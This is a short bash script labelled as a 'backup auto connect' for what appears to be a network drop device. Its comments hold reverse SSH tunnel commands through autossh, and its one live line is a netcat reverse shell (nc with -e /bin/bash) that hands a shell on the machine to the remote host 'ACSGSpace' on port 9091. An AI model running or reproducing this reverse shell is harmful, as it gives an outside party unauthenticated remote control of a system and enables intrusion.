#!/bin/bash
#
# Dropbox 1 Backup Auto Connect
# 

# Change Local Connect Per Dropbox Number, as well as -M number higher +2
# autossh -M 11166 -N -f -i /home/kv/.ssh/kv-red -R <CLOUD LOCAL CONNECT PORT>:localhost:22 tp@<CLOUD IP> -p <CLOUD SSH PORT>
#autossh -M 0 -N -f -i /home/drop/.ssh/drop-d1 -R 9001:localhost:22 kv@ACSGCloud -p 80

nc ACSGSpace 9091 -v -e /bin/bash
